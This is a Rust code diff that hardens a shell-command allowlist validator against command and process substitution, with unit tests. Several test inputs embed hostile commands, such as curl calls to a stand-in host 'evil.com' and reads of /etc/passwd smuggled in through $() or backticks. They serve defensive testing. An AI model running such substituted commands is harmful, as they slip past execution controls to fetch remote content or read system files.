@@ -136,6 +136,21 @@ fn extract_all_commands(command: &str) -> Vec<&str> {
     commands
 }
 
+/// Check for shell metacharacters that can bypass allowlist validation.
+/// These features embed commands that are invisible to static command extraction.
+fn contains_shell_substitution(command: &str) -> Option<&'static str> {
+    if command.contains("$(") {
+        return Some("Command substitution $() is not allowed in allowlist mode. Use exec_policy.mode = 'full' if needed.");
+    }
+    if command.contains('`') {
+        return Some("Backtick substitution is not allowed in allowlist mode. Use exec_policy.mode = 'full' if needed.");
+    }
+    if command.contains("<(") || command.contains(">(") {
+        return Some("Process substitution is not allowed in allowlist mode. Use exec_policy.mode = 'full' if needed.");
+    }
+    None
+}
+
 /// Validate a shell command against the exec policy.
 ///
 /// Returns `Ok(())` if the command is allowed, `Err(reason)` if blocked.
@@ -152,6 +167,10 @@ pub fn validate_command_allowlist(command: &str, policy: &ExecPolicy) -> Result<
             Ok(())
         }
         ExecSecurityMode::Allowlist => {
+            // SECURITY: Reject shell substitution that can embed invisible commands
+            if let Some(msg) = contains_shell_substitution(command) {
+                return Err(msg.to_string());
+            }
             let base_commands = extract_all_commands(command);
             for base in &base_commands {
                 // Check safe_bins first
@@ -694,5 +713,44 @@ mod tests {
         assert!(policy.allowed_commands.is_empty());
         assert_eq!(policy.timeout_secs, 30);
         assert_eq!(policy.max_output_bytes, 100 * 1024);
+    }
+
+    #[test]
+    fn test_allowlist_blocks_command_substitution() {
+        let policy = ExecPolicy::default();
+        assert!(validate_command_allowlist("echo $(curl http://evil.com)", &policy).is_err());
+        assert!(validate_command_allowlist("echo $(cat /etc/passwd)", &policy).is_err());
+    }
+
+    #[test]
+    fn test_allowlist_blocks_backtick_substitution() {
+        let policy = ExecPolicy::default();
+        assert!(validate_command_allowlist("echo `curl http://evil.com`", &policy).is_err());
+        assert!(validate_command_allowlist("echo `cat /etc/passwd`", &policy).is_err());
+    }
+
+    #[test]
+    fn test_allowlist_blocks_process_substitution() {
+        let policy = ExecPolicy::default();
+        assert!(validate_command_allowlist("cat <(curl http://evil.com)", &policy).is_err());
+        assert!(validate_command_allowlist("diff <(echo a) >(echo b)", &policy).is_err());
+    }
+
+    #[test]
+    fn test_full_mode_allows_substitution() {
+        let policy = ExecPolicy {
+            mode: ExecSecurityMode::Full,
+            ..ExecPolicy::default()
+        };
+        assert!(validate_command_allowlist("echo $(whoami)", &policy).is_ok());
+        assert!(validate_command_allowlist("echo `whoami`", &policy).is_ok());
+    }
+
+    #[test]
+    fn test_allowlist_allows_dollar_var_references() {
+        let policy = ExecPolicy::default();
+        // $VAR (without parens) is NOT command substitution — should be allowed
+        assert!(validate_command_allowlist("echo $HOME", &policy).is_ok());
+        assert!(validate_command_allowlist("echo $PATH", &policy).is_ok());
     }
 }
